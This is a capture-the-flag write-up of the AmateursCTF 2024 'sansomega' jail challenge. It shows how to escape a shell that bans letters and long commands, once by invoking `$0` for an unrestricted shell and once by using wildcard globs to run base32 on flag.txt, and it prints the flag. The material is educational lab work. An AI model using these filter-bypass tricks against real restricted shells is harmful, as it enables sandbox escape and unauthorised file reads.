---
title: "sansomega"
description: "Somehow I think the pico one had too many unintendeds..."
points: 207
solves: 230
author: Jozef Steinhübl
date: April 10 2024
---

## Introduction

![task](https://raw.githubusercontent.com/GerlachSnezka/amateursctf/main/assets/2024-jail-sansomega.png)

In this challenge, we had to bypass restrictions and write a shellcode that reads a `flag.txt` file and prints its content. We can't use any character from
```
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\\"\'`:{}[]
```

and can't have command longer than 20 characters.

## Solution

We can type `$0` which allows us to execute any command and bypass the restrictions as it's directly executed in the subprocess.

```bash
$ $0
cat flag.txt
exit
```

or we can also use `base32` and read flag.txt using that.

```bash
$ /???/????32 *.???
```

> We must use `???` instead of `bin` because we can't use any of the characters from the restricted list.  
> Sh will expand `???` to `bin`, `????32` to `base32` and `*.???` to `flag.txt`.  

Woala! We got the flag!

```
amateursCTF{pic0_w45n7_g00d_n0ugh_50_i_700k_som3_cr34t1v3_l1b3rt135_ade8820e}
```